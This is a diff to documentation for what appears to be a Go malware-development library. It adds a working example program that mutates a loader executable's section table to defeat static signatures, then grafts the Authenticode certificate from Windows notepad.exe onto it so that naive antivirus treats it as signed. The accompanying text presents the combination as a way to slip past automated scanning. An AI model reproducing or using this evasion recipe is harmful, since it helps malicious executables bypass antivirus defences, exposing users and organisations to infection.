@@ -57,6 +57,60 @@ cert.Strip(`C:\Temp\payload.exe`, "")
 
 ---
 
+## Combined Example
+
+Morph the loader's section table so UPX/Go fingerprints are gone, then
+graft the Authenticode certificate from a trusted Microsoft binary onto
+the result — the output passes `presence-only` signature checks while
+carrying a mutated section layout that defeats static signatures.
+
+```go
+package main
+
+import (
+    "os"
+
+    "github.com/oioio-space/maldev/pe/cert"
+    "github.com/oioio-space/maldev/pe/morph"
+)
+
+func main() {
+    // 1. Read the loader PE.
+    raw, err := os.ReadFile(`C:\Temp\loader.exe`)
+    if err != nil {
+        panic(err)
+    }
+
+    // 2. Morph section names to defeat UPX / Go-specific signatures.
+    morphed, err := morph.UPXMorph(raw)
+    if err != nil {
+        panic(err)
+    }
+    if err := os.WriteFile(`C:\Temp\loader.exe`, morphed, 0o644); err != nil {
+        panic(err)
+    }
+
+    // 3. Steal the Authenticode cert from a signed Microsoft binary and
+    //    append it to the morphed loader. Signature won't verify against
+    //    Microsoft's CA, but many defender tools only check for
+    //    certificate presence, not chain validity.
+    if err := cert.Copy(
+        `C:\Windows\System32\notepad.exe`,
+        `C:\Temp\loader.exe`,
+    ); err != nil {
+        panic(err)
+    }
+}
+```
+
+Layered benefit: `pe/morph` breaks static byte-pattern matches on the
+section table, and `pe/cert` adds the "signed" metadata that naive AV
+uses as a quick-trust heuristic — neither alone would survive modern
+triage, but together they raise the bar enough to slip past automated
+first-pass scanning.
+
+---
+
 ## API Reference
 
 See [pe.md](../../pe.md#pecert----authenticode-certificate-manipulation)
